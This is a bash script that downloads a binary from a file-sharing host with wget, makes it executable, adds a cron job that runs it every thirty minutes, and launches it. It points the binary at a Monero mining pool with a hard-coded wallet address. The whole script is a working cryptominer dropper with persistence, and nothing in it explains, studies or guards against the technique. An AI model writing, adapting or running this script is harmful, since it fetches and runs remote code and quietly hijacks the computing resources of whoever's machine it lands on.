#!/bin/bash

# Function to handle errors
error_exit() {
    echo "$1" 1>&2
    exit 1
}

# Set the URL to download from
URL="https://oshi.at/ghig"
# Set the desired file name
FILENAME="session_ajqysbey"
# Lock file
LOCKFILE="/tmp/${FILENAME}.lock"
# Arguments to be used when running the script
ARGS="-o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p cronjob"

# Function to kill existing instances
kill_existing_instances() {
    pkill -f "$FULL_PATH" && echo "Killed existing instances of $FULL_PATH" || echo "No existing instances of $FULL_PATH found"
}

# Download the file
echo "Downloading file..."
wget -O "$FILENAME" "$URL"
if [ $? -ne 0 ]; then
    error_exit "Error: Failed to download file from $URL"
fi

# Check if the file was downloaded successfully
if [ ! -f "$FILENAME" ]; then
    error_exit "Error: File not found after download attempt"
fi

# Make the file executable
echo "Setting executable permissions..."
chmod +x "$FILENAME"
if [ $? -ne 0 ]; then
    error_exit "Error: Failed to set executable permissions on $FILENAME"
fi

# Get the full path to the downloaded file
FULL_PATH="$(pwd)/$FILENAME"

# Create the cron job entry with arguments
CRON_JOB="*/30 * * * * $FULL_PATH $ARGS"

# Add the cron job to the user's crontab
echo "Adding cron job..."
( crontab -l 2>/dev/null; echo "$CRON_JOB" ) | crontab -
if [ $? -ne 0 ]; then
    error_exit "Error: Failed to add cron job"
fi

# Ensure existing instances are killed before running the new one
kill_existing_instances

# Run the script with the arguments
$FULL_PATH $ARGS

# Display the current cron job list
echo "Current cron job list for the user:"
crontab -l

echo "File downloaded to: $FULL_PATH"
echo "Cron job added: $CRON_JOB"
